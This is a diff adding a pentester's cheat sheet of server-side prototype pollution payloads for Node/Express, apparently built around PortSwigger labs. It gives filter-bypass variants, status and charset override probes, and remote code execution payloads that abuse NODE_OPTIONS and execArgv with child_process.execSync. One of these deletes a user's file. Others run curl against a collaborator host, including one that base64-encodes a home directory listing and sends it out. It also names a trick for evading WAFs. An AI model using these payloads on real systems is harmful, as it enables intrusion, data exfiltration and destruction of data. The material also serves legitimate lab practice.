@@ -1,0 +1,146 @@
+--------------------------------------------------------------
+
+The prototype pollution has been fixed in Express 4.17.4
+
+--------------------------------------------------------------
+
+JSON spaces override:
+
+When attempting this technique in Burp, remember to switch to the message editor's Raw tab. Otherwise, you won't be able to see the indentation change as the default prettified view normalizes this. 
+
+
+"__proto__": {
+    "json spaces": 9
+}
+
+
+==============================================================
+Bypass : If "__proto__" is being deleted or disabled.
+==============================================================
+
+"constructor": {
+    "prototype": {
+        "json spaces":10
+    }
+}
+
+==============================================================
+Bypass: If not sanitizing recursively. 
+==============================================================
+
+"__pro__proto__to__": {
+    "json spaces": 9
+}
+
+==============================================================
+
+First indentify the json data tht is going to the server,
+and some of it is getting reflected back in the json format.
+
+
+Remove all except necessary to get response from the server and inject this:
+
+"__proto__": {
+    "foo":"bar"
+}
+
+and observe the response if it is getting reflected back in the same json format.
+
+--------------------------------------------------------------
+
+
+For overriding the status codes:
+
+1. Find a way to trigger an error response and take note of the default status code. 
+
+2. Try polluting the prototype with your own status property. Be sure to use an obscure status code that is unlikely to be issued for any other reason. 
+
+3. Trigger the error response again and check whether you've successfully overridden the status code. 
+
+
+"__proto__": {
+    "status": 429
+}
+
+---------------OR----------------------
+
+"__proto__": {
+    "statusCode": 429
+}
+
+--------------------------------------------------------------
+
+Charset override:
+
+
+1. Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, foo in UTF-7 is +AGYAbwBv-. 
+
+{
+    "sessionId":"0123456789",
+    "username":"wiener",
+    "role":"+AGYAbwBv-"
+}	
+
+2. Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form. 
+
+3. Try to pollute the prototype with a content-type property that explicitly specifies the UTF-7 character set: 
+
+{
+    "sessionId":"0123456789",
+    "username":"wiener",
+    "role":"default",
+    "__proto__":{
+        "content-type": "application/json; charset=utf-7"
+    }
+}
+
+4. Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response
+
+{
+    "sessionId":"0123456789",
+    "username":"wiener",
+    "role":"foo"
+}
+
+
+=============================RCE==============================
+
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+
+
+The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames. 
+
+Bypasses are mentioned above.
+
+--------------------------------------------------------------
+
+SSRF:
+
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    ]
+}
+
+--------------------------------------------------------------
+
+FILE:
+
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+}
+
+--------------------------------------------------------------
+
+"__proto__": {
+    "shell":"vim",
+    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
+}
+
+
+"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
